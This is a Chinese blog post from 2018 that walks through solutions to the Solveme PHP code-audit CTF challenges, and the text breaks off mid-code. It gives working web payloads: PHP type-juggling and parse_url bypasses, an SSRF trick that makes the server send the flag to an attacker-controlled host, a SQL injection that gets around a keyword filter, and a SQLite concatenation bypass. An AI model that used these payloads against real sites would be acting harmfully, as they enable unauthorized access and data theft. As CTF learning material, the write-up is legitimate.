@@ -1,0 +1,1440 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222"/>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0"/>
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.7.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.7.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言最近在学长的建议下开始做solveme网站的题目，都是代码审计的题目，学到了很多的东西，记录一下">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Solveme题解">
+<meta property="og:url" content="http://chaosec.top/2018/07/31/solveme/index.html">
+<meta property="og:site_name" content="Charles&#39; Blog">
+<meta property="og:description" content="前言最近在学长的建议下开始做solveme网站的题目，都是代码审计的题目，学到了很多的东西，记录一下">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-08-06T03:46:09.371Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Solveme题解">
+<meta name="twitter:description" content="前言最近在学长的建议下开始做solveme网站的题目，都是代码审计的题目，学到了很多的东西，记录一下">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Charles' Blog" type="application/atom+xml"/>
+
+
+
+
+  <link rel="canonical" href="http://chaosec.top/2018/07/31/solveme/"/>
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Solveme题解 | Charles' Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="bg_content">
+    <canvas id="canvas"></canvas>
+  </div>
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Charles' Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">前方如聂鲁达的爱情诗一般美好</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br/>关于</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br/>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://chaosec.top/2018/07/31/solveme/"/>
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="新城瑞雪"/>
+      <meta itemprop="description" content="相逢意气为君饮"/>
+      <meta itemprop="image" content="/images/avatar.gif"/>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Charles' Blog"/>
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Solveme题解
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-07-31 09:59:41" itemprop="dateCreated datePublished" datetime="2018-07-31T09:59:41+08:00">2018-07-31</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2018-08-06 11:46:09" itemprop="dateModified" datetime="2018-08-06T11:46:09+08:00">2018-08-06</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+            <span id="/2018/07/31/solveme/" class="leancloud_visitors" data-flag-title="Solveme题解">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读次数：</span>
+              
+                <span class="leancloud-visitors-count"></span>
+            </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学长的建议下开始做solveme网站的题目，都是代码审计的题目，学到了很多的东西，记录一下</p>
+<a id="more"></a>
+<h1 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h1><p>逆向跑一遍即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$flag = <span class="string">'1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY='</span>;</span><br><span class="line"><span class="keyword">echo</span> hex2bin(strrev(bin2hex(base64_decode($flag))));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="Bad-compare"><a href="#Bad-compare" class="headerlink" title="Bad compare"></a>Bad compare</h1><p>这个题目是字符串在不同编码下显示不同的问题，如果直接复制粘贴比较的会发生错误，办法是bp抓包查看16进制值提交上去就可以正确比较啦</p>
+<h1 id="Winter-sleep"><a href="#Winter-sleep" class="headerlink" title="Winter sleep"></a>Winter sleep</h1><p>利用PHP的数字解析漏洞，payload</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">time</span>=6e6</span><br></pre></td></tr></table></figure>
+<h1 id="Hard-login"><a href="#Hard-login" class="headerlink" title="Hard login"></a>Hard login</h1><p>这个题目想得到flag就是需要让username和passwd和它隐藏的相等，看到用户名只有三位猜测可能是考察爆破，但是没有爆破成功，到这儿就卡住了，最后看了一下学长博客，才知道这题要用到 <code>curl</code>，这个命令之前几乎没用过，算是一个新知识点，得学习一下了。不知道为什么直接在浏览器中访问index.php页面就不行，用curl命令就可以</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">http:</span><span class="comment">//hardlogin.solveme.peng.kr/index.php</span></span><br></pre></td></tr></table></figure>
+<h1 id="URL-filtering"><a href="#URL-filtering" class="headerlink" title="URL filtering"></a>URL filtering</h1><p>分析代码可知，代码大概思路是解析一下url(parse_url)，对于得到的字符串用&amp;分隔为数组，在对于每个数组值以等号分隔出key,value对，要求key中不能出现 <code>do_you_want_flag</code>,value中不能出现 <code>yes</code>，但是再获取flag时又要求必须是 <code>do_you_want_flag=yes</code>，显然是矛盾的，但是在翻看PHP手册查看parse_url函数时发现一句话</p>
+<blockquote>
+<p>对严重不合格的 URL，parse_url() 可能会返回 FALSE。</p>
+</blockquote>
+<p>所以猜测可能是这个parse函数存在突破点，搜索一下发现有个GeekPwn2016ctf比赛中就考过这个知识点，得到payload</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//u</span>rlfiltering.solveme.peng.kr<span class="regexp">//</span><span class="regexp">/?do_you_want_flag=yes</span></span><br></pre></td></tr></table></figure>
+<h1 id="Hash-collision"><a href="#Hash-collision" class="headerlink" title="Hash collision"></a>Hash collision</h1><p>直接数组绕过</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?foo<span class="string">[]</span>=<span class="number">1</span>&amp;bar<span class="string">[]</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure>
+<h1 id="Array2String"><a href="#Array2String" class="headerlink" title="Array2String"></a>Array2String</h1><p>题目核心在于提交 <code>15th_HackingCamp</code>对应的ascii码值，但是流程又限制数字不能在(32,127)之间，官网查找一下chr函数的描述可以看到如下描述</p>
+<blockquote>
+<p>Note that if the number is higher than 256, it will return the number mod 256.</p>
+</blockquote>
+<p>就是说如果数字大于256的话它会自动取模，所以就简单了</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://array2string.solveme.peng.kr/<span class="keyword">index</span>.php?<span class="keyword">password</span>=simple_passw0rd&amp;<span class="keyword">value</span>[]=<span class="number">305</span>&amp;<span class="keyword">value</span>[]=<span class="number">309</span>&amp;<span class="keyword">value</span>[]=<span class="number">372</span>&amp;<span class="keyword">value</span>[]=<span class="number">360</span>&amp;<span class="keyword">value</span>[]=<span class="number">351</span>&amp;<span class="keyword">value</span>[]=<span class="number">328</span>&amp;<span class="keyword">value</span>[]=<span class="number">353</span>&amp;<span class="keyword">value</span>[]=<span class="number">355</span>&amp;<span class="keyword">value</span>[]=<span class="number">363</span>&amp;<span class="keyword">value</span>[]=<span class="number">361</span>&amp;<span class="keyword">value</span>[]=<span class="number">366</span>&amp;<span class="keyword">value</span>[]=<span class="number">359</span>&amp;<span class="keyword">value</span>[]=<span class="number">323</span>&amp;<span class="keyword">value</span>[]=<span class="number">353</span>&amp;<span class="keyword">value</span>[]=<span class="number">365</span>&amp;<span class="keyword">value</span>[]=<span class="number">368</span></span><br></pre></td></tr></table></figure>
+<h1 id="Flag-not-found"><a href="#Flag-not-found" class="headerlink" title="Flag not found"></a>Flag not found</h1><h1 id="Give-me-a-link-2"><a href="#Give-me-a-link-2" class="headerlink" title="Give me a link 2"></a>Give me a link 2</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$parse = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?$/i'</span>, $parse[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Not allowed scheme'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i'</span>, $parse[<span class="string">'host'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Not allowed host'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/\/plz_give_me$/'</span>, $parse[<span class="string">'path'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>分析代码，题目过滤了几个条件</p>
+<blockquote>
+<p>1、 url中不能出现 <code>_</code> 以及其他不可见字符<br>2、 path字段中又必须出现 <code>plz_give_me</code> 字段<br>3、 限制输入的网址必须是 <code>localhost</code> 或 <code>127.x.x.x</code> 这种类型的网址</p>
+</blockquote>
+<p>1和2冲突，可以用前面一题的方法绕过之<br>对于第三个，有个绕过方法就是 <code>ip2long()</code> 函数将网络地址转化为数字地址，这样就可以绕过.的ip过滤</p>
+<p>所以最终payload为</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https</span>://givemealink2.solveme.peng.kr/?url=https:num_ip:12580/plz<span class="number">%0</span>agive<span class="number">%0</span>ame</span><br></pre></td></tr></table></figure>
+<h1 id="Give-me-a-link"><a href="#Give-me-a-link" class="headerlink" title="Give me a link"></a>Give me a link</h1><p>关键代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?\:\/\/'</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/i'</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Not allowed URL'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $parse = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>($parse[<span class="string">'path'</span>] !== <span class="string">'/plz_give_me'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $parse[<span class="string">'scheme'</span>].<span class="string">'://'</span>.$parse[<span class="string">'host'</span>].<span class="string">'/'</span>.$flag);</span><br></pre></td></tr></table></figure>
+<p>第一个和第三个的条件矛盾，具体参见前文，其中 <code>$_SERVER[&#39;HTTP_HOST&#39;]</code> 又和</p>
+<p><code>curl_setopt($ch, CURLOPT_URL, $parse[&#39;scheme&#39;].&#39;://&#39;.$parse[&#39;host&#39;].&#39;/&#39;.$flag);</code> </p>
+<p>矛盾，因为http_host内容找不不允许修改，但是查看PHP手册可知</p>
+<blockquote>
+<p>$url = ‘<a href="http://username:password@hostname/path?arg=value#anchor" target="_blank" rel="noopener">http://username:password@hostname/path?arg=value#anchor</a>‘;</p>
+</blockquote>
+<p>这样的方式也可以解析url，所以构造</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//gi</span>vemealink.solveme.peng.kr<span class="regexp">/?url=http:/</span><span class="regexp">/givemealink.solveme.peng.kr@ip_addr/</span>plz%<span class="number">1</span>agive%<span class="number">1</span>ame</span><br></pre></td></tr></table></figure>
+<p>注意要先监听80端口,还要不要用https，因为https返回的数据是乱码：）</p>
+<h1 id="Replace-filter"><a href="#Replace-filter" class="headerlink" title="Replace filter"></a>Replace filter</h1><p>关键代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'say'</span>]) &amp;&amp; strlen($_GET[<span class="string">'say'</span>]) &lt; <span class="number">20</span>)&#123;</span><br><span class="line"></span><br><span class="line">    $say = preg_replace(<span class="string">'/^(.*)flag(.*)$/'</span>, <span class="string">'$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;'</span>, $_GET[<span class="string">'say'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/give_me_the_flag/'</span>, $say))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'What the f**k?'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里看学长的博客get到了新姿势，这个题目绕过的点在 <code>.*</code> 这里，这个可以匹配任意字符，但是不可以匹配换行，而 <code>^$</code> 又限制了字符串必须在同一行，所以绕过就简单了，payload</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//replacefilter.solveme.peng.kr/?say=%0agive_me_the_flag</span></span><br></pre></td></tr></table></figure>
+<h1 id="Hell-JS"><a href="#Hell-JS" class="headerlink" title="Hell JS"></a>Hell JS</h1><h1 id="Anti-SQLi"><a href="#Anti-SQLi" class="headerlink" title="Anti SQLi"></a>Anti SQLi</h1><p>关键过滤如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">preg_match(</span><br><span class="line">           <span class="string">'/\.|\`|"|\'|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|'</span>.</span><br><span class="line">           <span class="string">'=|&lt;|&gt;|\(|\)|@@|\|\||&amp;&amp;|#|\/\*.*\*\/|--[\s\xA0]|'</span>.</span><br><span class="line">           <span class="string">'0x[0-9a-f]+|0b[01]+|x\'[0-9a-f]+\'|b\'[01]+\'|'</span>.</span><br><span class="line">           <span class="string">'[\s\xA0\'"]+(as|or|and|r*like|regexp)[\s\xA0\'"]+|'</span>.</span><br><span class="line">           <span class="string">'union[\s\xA0]+select|[\s\xA0](where|having)|'</span>.</span><br><span class="line">           <span class="string">'[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|'</span>.</span><br><span class="line">           <span class="string">'information_schema|procedure\s+analyse\s*/is'</span>,</span><br><span class="line">           $id.<span class="string">','</span>.$pw</span><br><span class="line">       ) <span class="keyword">and</span> <span class="keyword">die</span>(<span class="string">'Hack detected'</span>);</span><br></pre></td></tr></table></figure>
+<p>sql语句即判断条件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query(</span><br><span class="line">                $con, </span><br><span class="line">                <span class="string">"SELECT * FROM `antisqli` WHERE `id`='&#123;$id&#125;' AND `pw`=md5('&#123;$pw&#125;');"</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        mysqli_close($con);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">            <span class="keyword">if</span>($result[<span class="string">'no'</span>] === <span class="string">'31337'</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'Hello, '</span>, $result[<span class="string">'id'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Login failed'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
+<p>该正则匹配中 <code>|\\|</code> 是无法匹配到 <code>\</code> 的，必须要用四个才可以，所以这道题目中 \ 是可以用的，用 <code>id=\</code> 可以成功吃掉一个引号。<br>正则中 <code>union[\s\xA0]+select</code> 还可考虑用 <code>union all select</code> 绕过，正则 <code>--[\s\xA0]</code> ，其中查资料发现</p>
+<blockquote>
+<p>\s :匹配任何不可见字符，包括空格、制表符、换页符等等。等价于[\f\n\r\t\v]</p>
+</blockquote>
+<p>也就是说还有其它字符可以匹配，例如 <code>%01,%11,%02</code> ，基于以上内容可以构造payload</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>\&amp;pw=<span class="class"><span class="keyword">union</span> <span class="title">all</span> <span class="title">select</span> 1222,212,12 <span class="title">from</span> <span class="title">antisqli</span>--%10</span></span><br></pre></td></tr></table></figure>
+<p>最终payload</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>\&amp;pw=<span class="class"><span class="keyword">union</span> <span class="title">all</span> <span class="title">select</span> 31337,2,3 <span class="title">from</span> <span class="title">antisqli</span>--%10</span></span><br></pre></td></tr></table></figure>
+<h1 id="Name-Check"><a href="#Name-Check" class="headerlink" title="Name Check"></a>Name Check</h1><p>关键过滤如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/admin|--|;|\(\)|\/\*|\\0/i"</span>, $name))</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$res = $sql-&gt;query(<span class="string">"</span></span><br><span class="line"><span class="string">            SELECT </span></span><br><span class="line"><span class="string">            MAX('0','1','&#123;$name&#125;') LIKE 'a%', </span></span><br><span class="line"><span class="string">            INSTR('&#123;$name&#125;','d')&gt;0, </span></span><br><span class="line"><span class="string">            MIN('&#123;$name&#125;','b','c') LIKE '__m__', </span></span><br><span class="line"><span class="string">            SUBSTR('&#123;$name&#125;',-2)='in'</span></span><br><span class="line"><span class="string">        ;"</span>);</span><br><span class="line">        <span class="keyword">if</span>($res === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Database error'</span>;</span><br><span class="line">            <span class="keyword">goto</span> quit;</span><br><span class="line">        &#125;</span><br><span class="line">        $row = $res-&gt;fetchArray(SQLITE3_NUM);</span><br><span class="line">        <span class="keyword">if</span>(</span><br><span class="line">            $row[<span class="number">0</span>] + $row[<span class="number">1</span>] + $row[<span class="number">2</span>] + $row[<span class="number">3</span>] !== <span class="number">4</span> ||</span><br><span class="line">            array_sum($row) !== <span class="number">4</span> </span><br><span class="line">        )&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Auth failed'</span>;</span><br><span class="line">            <span class="keyword">goto</span> quit;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure>
+<p>看代码可知题目应该是要求四个选择条件都成立，按照题目要求应该就是输入admin才可以，但是题目过滤了admin，查阅sqlite发现，它在连接字符串的时候用的是 <code>||</code> 而不是 <code>+</code> ，所以payload： <code>?name=ad&#39;||&#39;min</code> </p>
+<h1 id="I-am-slowly"><a href="#I-am-slowly" class="headerlink" title="I am slowly"></a>I am slowly</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($answer))&#123;</span><br><span class="line">    $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">        <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL server down'</span>);</span><br><span class="line"></span><br><span class="line">    $result = mysqli_fetch_array(</span><br><span class="line">        mysqli_query($con, <span class="string">"SELECT `count` FROM `&#123;$table&#125;`;"</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">        mysqli_query($con, <span class="string">"CREATE TABLE IF NOT EXISTS `&#123;$table&#125;` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);"</span>);</span><br><span class="line">        $new_answer = md5(sha1(<span class="string">'iamslowly_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand().<span 